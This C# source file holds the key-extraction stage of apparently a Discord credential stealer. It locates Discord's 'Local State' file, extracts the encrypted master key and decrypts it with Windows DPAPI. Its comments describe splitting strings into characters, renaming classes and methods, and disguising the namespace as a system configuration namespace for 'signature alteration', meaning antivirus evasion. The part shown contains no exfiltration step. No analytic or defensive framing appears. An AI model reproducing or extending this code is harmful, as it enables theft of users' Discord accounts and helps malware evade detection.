using System; // Used for Environment, Exception, Console, etc.
using System.IO; // Used for Path, File, Directory operations
using System.Linq; // Still referenced, but avoiding .Skip().ToArray()
using System.Text; // For StringBuilder and Encoding
using System.Text.RegularExpressions; // Still used for regex matching
// Renamed namespace from OdPS.Utils to AppCore.Utilities
using AppCore.Utilities; // Used for DPAPI helper

// Renamed namespace to something less descriptive or more generic
namespace System.Configuration.AppVault // Example: Changed from System.Security.CredentialAccess
{
    // Renamed class from KeyAcquirer to VaultAccessor for signature alteration
    internal static class VaultAccessor
    {
        // Obfuscated string parts for critical file names and paths.
        // Using StringBuilder and char arrays for less common string literal patterns.
        private static readonly string ConfigFileName = new StringBuilder().Append('L').Append('o').Append('c').Append('a').Append('l').Append(' ').Append('S').Append('t').Append('a').Append('t').Append('e').ToString(); // "Local State"
        private static readonly string TargetAppFolder = string.Format("{0}{1}{2}{3}{4}{5}{6}", 'd', 'i', 's', 'c', 'o', 'r', 'd'); // "discord"
        private static readonly string RoamingSubDir = new string(new char[] { 'R', 'o', 'a', 'm', 'i', 'n', 'g' }); // "Roaming"

        // Regex pattern built dynamically to avoid literal string in binary
        private static readonly string EncryptedKeyPattern = string.Format("{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}", '"', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':') + @"\s*""(.*?)"""; // """encrypted_key"":\s*""(.*?)"""

        private const int PrefixLength = 5; // Renamed constant for prefix length

        /// <summary>
        /// Locates Discord's configuration, extracts and decrypts the master key.
        /// </summary>
        /// <returns>The decrypted master key as a byte array, or null on failure.</returns>
        internal static byte[] FetchEncryptedPayload() // Renamed method for signature alteration
        {
            // Construct the typical path to the Discord 'Local State' file.
            // Using StringBuilder and Path.DirectorySeparatorChar for path construction to alter signature.
            string profilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Build the path using StringBuilder for a less common string construction signature.
            StringBuilder pathBuilder = new StringBuilder();
            pathBuilder.Append(profilePath);
            pathBuilder.Append(Path.DirectorySeparatorChar);
            pathBuilder.Append("AppData");
            pathBuilder.Append(Path.DirectorySeparatorChar);
            pathBuilder.Append(RoamingSubDir); // "Roaming"
            pathBuilder.Append(Path.DirectorySeparatorChar);
            pathBuilder.Append(TargetAppFolder); // "discord"
            pathBuilder.Append(Path.DirectorySeparatorChar);
            pathBuilder.Append(ConfigFileName); // "Local State"

            string filePath = pathBuilder.ToString();

            // Check if the 'Local State' file exists at the expected path.
            if (!File.Exists(filePath))
            {
                Console.WriteLine($"[DEBUG] File not found: {filePath}"); // Debugging output
                return null; // Return null if the file is not found.
            }

            try
            {
                // Read the entire content of the 'Local State' file as a string.
                string fileContent = File.ReadAllText(filePath, Encoding.UTF8);

                // Use a regular expression to find the value associated with the key "encrypted_key".
                // Using the dynamically constructed pattern.
                Match regexMatch = Regex.Match(fileContent, EncryptedKeyPattern);
                string encodedKeyString = regexMatch.Groups[1].Value;

                // Check if the "encrypted_key" was found and the extracted Base64 string is not empty.
                if (string.IsNullOrEmpty(encodedKeyString))
                {
                    Console.WriteLine("[DEBUG] Encrypted key not found in JSON or is empty."); // Debugging output
                    return null; // Return null if the encrypted key value is missing from the JSON.
                }

                // Convert the Base64 encoded string back into a byte array.
                byte[] rawEncryptedBytes = Convert.FromBase64String(encodedKeyString);

                // Ensure the array is large enough before attempting to skip.
                if (rawEncryptedBytes.Length < PrefixLength)
                {
                    Console.WriteLine("[DEBUG] Encrypted key too short after Base64 decoding."); // Debugging output
                    return null;
                }

                // Skip the first 5 bytes to get the DPAPI-encrypted data payload.
                // Using Buffer.BlockCopy for signature alteration instead of LINQ's Skip().ToArray().
                byte[] payloadBytes = new byte[rawEncryptedBytes.Length - PrefixLength];
                Buffer.BlockCopy(rawEncryptedBytes, PrefixLength, payloadBytes, 0, payloadBytes.Length);

                // Use the DPAPI helper class to decrypt the byte array using the Windows DPAPI.
                // Assuming DPAPI class exists in AppCore.Utilities namespace.
                byte[] finalDecryptedKey = DPAPI.Decrypt(payloadBytes);

                if (finalDecryptedKey == null)
                {
                    Console.WriteLine("[DEBUG] DPAPI decryption failed (returned null)."); // Debugging output
                }
                return finalDecryptedKey;
            }
            catch (FormatException formatEx) // Specific catch for Base64 decoding issues
            {
                Console.WriteLine($"[ERROR] Format Exception during key retrieval (e.g., malformed Base64): {formatEx.Message}");
                return null;
            }
            catch (Exception generalEx)
            {
                // Log the error message.
                Console.WriteLine($"[ERROR] Unexpected error during key retrieval: {generalEx.Message}");
                return null; // Return null to indicate that the master key could not be retrieved.
            }
        }
    }
}
